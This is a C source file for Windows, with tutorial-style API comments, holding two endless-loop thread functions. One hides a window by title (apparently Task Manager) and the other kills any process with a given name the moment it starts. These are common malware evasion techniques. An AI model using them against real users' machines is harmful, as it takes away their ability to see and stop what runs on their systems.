#include <shlobj.h>
#include <windows.h>
#include <process.h>
#include <winbase.h>
#include <tlhelp32.h>
#include <string.h>

// Prevent Window From Popping Up
DWORD WINAPI disableProcessWindow(LPVOID file)
{
	while(1)
	{
		char * filename = (char *)file;
		HWND TaskM;
		TaskM=FindWindowA(NULL,filename);
		ShowWindow(TaskM,0);
	}
}

// Kill Process As Soon As It Starts
DWORD WINAPI killProcessByName(LPVOID file)
{
	char * filename = (char *)file;
	while(1)
	{
		HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
		/*Takes a snapshot of the specified processes, as well as the heaps, modules, and threads used by these processes.
		HANDLE CreateToolhelp32Snapshot(DWORD dwFlags,DWORD th32ProcessID);
		The TH32CS_SNAPALL flag Includes all processes and threads in the system, plus the heaps and modules of the process specified in th32ProcessID. Equivalent to specifying the TH32CS_SNAPHEAPLIST, TH32CS_SNAPMODULE, TH32CS_SNAPPROCESS, and TH32CS_SNAPTHREAD values combined using an OR operation ('|').
		th32ProcessID : The process identifier of the process to be included in the snapshot.
		*/
		if (!hSnapShot)
		{
			return -1;
		}

		PROCESSENTRY32 pEntry; //Describes an entry from a list of the processes residing in the system address space when a snapshot was taken.
		/*
		typedef struct tagPROCESSENTRY32 {
		DWORD     dwSize; <- Size of struct
		DWORD     cntUsage;
		DWORD     th32ProcessID; <- The process identifier.
		ULONG_PTR th32DefaultHeapID;
		DWORD     th32ModuleID;
		DWORD     cntThreads;
		DWORD     th32ParentProcessID;
		LONG      pcPriClassBase;
		DWORD     dwFlags;
		CHAR      szExeFile[MAX_PATH]; <- Name Of Executable
		} PROCESSENTRY32;
		*/
		pEntry.dwSize = sizeof (pEntry);

		BOOL hRes = Process32First(hSnapShot, &pEntry); //Process32FirstA is just the ANSI Version Of Process32First API, which takes UNICODE characters otherwise
		/*
		Process32First : Retrieves information about the first process encountered in a system snapshot.Returns TRUE if the first entry of the process list has been copied to the buffer or FALSE otherwise.
		BOOL Process32First(
	  	HANDLE           hSnapshot,
	  	LPPROCESSENTRY32 lppe
		);
		 
		Parameters : 
		hSnapshot : A handle to the snapshot returned from a previous call to the CreateToolhelp32Snapshot function.
		lppe : A pointer to a PROCESSENTRY32 structure. It contains process information such as the name of the executable file, the process identifier, and the process identifier of the parent process.
		*/

		while (hRes)
	    {
	        if (strcmp(pEntry.szExeFile, filename) == 0) 
	        {
	            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pEntry.th32ProcessID);
	            if (hProcess)
	            {
	                TerminateProcess(hProcess, 9);
	                CloseHandle(hProcess);
	            }
	        }
	        hRes = Process32Next(hSnapShot, &pEntry);
	    }

	    CloseHandle(hSnapShot);
	}
}

